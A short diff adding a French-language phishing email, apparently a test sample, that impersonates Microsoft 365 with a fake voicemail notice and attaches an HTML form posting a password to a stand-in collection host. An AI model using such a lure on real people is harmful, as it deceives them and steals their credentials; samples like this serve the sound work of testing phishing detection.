@@ -1,0 +1,16 @@
+From: Microsoft 365 <no-reply@office-notice.example.net>
+To: victime@example.org
+Subject: Message vocal en attente
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="m5"
+
+--m5
+Content-Type: text/plain; charset="utf-8"
+
+Vous avez 1 message vocal. Ouvrez la pièce jointe pour l'écouter.
+--m5
+Content-Type: text/html; name="Message_vocal.html"
+Content-Disposition: attachment; filename="Message_vocal.html"
+
+<form action="https://collect.example.net/p"><input name="password"></form>
+--m5--
